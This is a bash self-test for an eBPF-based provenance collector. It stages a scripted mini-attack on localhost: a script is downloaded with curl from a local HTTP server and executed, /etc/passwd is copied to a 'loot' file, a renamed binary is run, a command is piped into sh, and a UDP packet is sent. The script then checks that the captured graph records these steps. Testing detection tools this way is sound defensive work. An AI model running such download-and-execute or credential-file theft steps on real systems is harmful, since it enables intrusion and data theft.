#!/bin/bash
# End-to-end check of the collector on THIS machine:
#   1. start the loader, 2. play a small attack (download a script, run it, steal /etc/passwd,
#   rename a binary, pipe into a shell, UDP send), 3. check that the provenance graph contains it.
#
#   sudo tests/selftest.sh
set -u
cd "$(dirname "$0")/.."
[ "$(id -u)" -eq 0 ] || { echo "run as root (sudo)"; exit 1; }
[ -x ./loader ] && [ -f ./probe.bpf.o ] || { echo "build first: make"; exit 1; }

W=$(mktemp -d /tmp/phips-selftest.XXXXXX)
CAP="$W/capture.jsonl"

./loader > "$CAP" 2> "$W/loader.err" &
LOADER=$!
sleep 2
kill -0 $LOADER 2>/dev/null || { echo "loader failed to start:"; cat "$W/loader.err"; exit 1; }

(
  cd "$W"
  mkdir -p www
  printf '#!/bin/sh\ncat /etc/passwd > %s/loot.txt\n' "$W" > www/x.sh
  python3 -m http.server 18080 --bind 127.0.0.1 --directory www >/dev/null 2>&1 &
  SRV=$!
  sleep 1
  curl -s -o "$W/x.sh" http://127.0.0.1:18080/x.sh      # download (network -> file)
  chmod +x x.sh && ./x.sh                                # run it (file -> process), steal data
  cp /bin/true ./a.bin && mv a.bin renamed.bin && ./renamed.bin   # rename then execute
  echo "echo piped > $W/p.txt" | sh                      # pipe into a shell
  env definitely_not_a_command 2>/dev/null               # failed PATH search: must NOT be an exec
  python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("127.0.0.53", 53))'
  kill $SRV
)
sleep 1
kill -INT $LOADER
wait $LOADER
cat "$W/loader.err"

python3 tests/check_selftest.py "$CAP" "$W"
STATUS=$?
echo "capture kept in $CAP"
exit $STATUS
